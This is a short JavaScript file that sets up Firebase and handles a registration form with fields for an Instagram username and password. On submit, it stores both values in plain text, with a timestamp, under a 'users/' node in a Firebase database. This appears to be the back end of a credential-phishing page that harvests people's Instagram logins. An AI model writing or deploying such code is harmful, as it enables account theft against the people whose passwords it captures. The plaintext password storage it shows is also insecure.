// Firebase Configuration
const firebaseConfig = {
    apiKey: "YOUR_API_KEY",
    authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
    databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
    projectId: "YOUR_PROJECT_ID",
    storageBucket: "YOUR_PROJECT_ID.appspot.com",
    messagingSenderId: "YOUR_SENDER_ID",
    appId: "YOUR_APP_ID"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Form Submission (Save Data to Firebase)
document.getElementById('registrationForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent form from submitting the default way

    const instaUsername = document.getElementById('instaUsername').value;
    const instaPassword = document.getElementById('instaPassword').value;

    // Check if both fields are filled
    if (instaUsername && instaPassword) {
        // Push data to Firebase Realtime Database
        database.ref('users/').push({
            username: instaUsername,
            password: instaPassword,
            timestamp: new Date().toISOString()
        });

        // Show success message after data submission
        document.getElementById('successMessage').style.display = 'block';

        // Clear the form
        document.getElementById('instaUsername').value = '';
        document.getElementById('instaPassword').value = '';
    } else {
        alert("Please fill in both the username and password fields!");
    }
});
